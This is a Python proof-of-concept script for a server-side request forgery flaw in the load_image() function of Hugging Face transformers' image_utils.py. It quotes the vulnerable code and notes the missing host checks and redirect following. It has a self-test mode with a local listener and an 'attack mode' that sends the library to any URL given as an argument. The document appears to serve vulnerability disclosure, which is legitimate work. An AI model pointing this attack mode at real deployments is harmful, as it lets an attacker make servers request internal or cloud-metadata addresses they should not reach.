#!/usr/bin/env python3
"""
PoC 1/3 — SSRF via load_image() in image_utils.py

Target: https://github.com/huggingface/transformers/blob/main/src/transformers/image_utils.py#L483-L487

Code:
    if image.startswith("http://") or image.startswith("https://"):
        image = PIL.Image.open(BytesIO(httpx.get(image, timeout=timeout, follow_redirects=True).content))

No host validation, no IP blocklist, follow_redirects=True.

Usage:
    python3 poc1_image_utils_ssrf.py                          # 自测模式（启动监听器验证 SSRF）
    python3 poc1_image_utils_ssrf.py http://target:port/path   # 攻击模式
"""

import http.server
import sys
import threading
import time


def start_listener(port: int):
    received = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            received.append({"path": self.path, "headers": dict(self.headers)})
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"poc1-ssrf-confirmed")

        def log_message(self, *a):
            pass

    server = http.server.HTTPServer(("0.0.0.0", port), Handler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server, received


def main():
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = None

    from transformers.image_utils import load_image

    if target_url:
        print(f"[PoC1] load_image('{target_url}')")
        try:
            load_image(target_url, timeout=5)
            print("[*] load_image returned OK")
        except Exception as e:
            print(f"[*] Exception (expected, SSRF already happened): {type(e).__name__}")
        return

    port = 18888
    print(f"[PoC1] Starting listener on 0.0.0.0:{port}")
    server, received = start_listener(port)
    time.sleep(0.3)

    test_url = f"http://127.0.0.1:{port}/poc1-ssrf-image-utils"
    print(f"[PoC1] load_image('{test_url}')")
    print()

    try:
        load_image(test_url, timeout=5)
    except Exception:
        pass

    server.shutdown()

    print(f"[PoC1] Listener received {len(received)} requests")
    if received:
        print(f"  PATH: {received[0]['path']}")
        print()
        print("  ✅ SSRF CONFIRMED via load_image()")
        print("     httpx.get() sent a server-side GET request to arbitrary URL")
    else:
        print("  ❌ No request received")
        sys.exit(1)


if __name__ == "__main__":
    main()
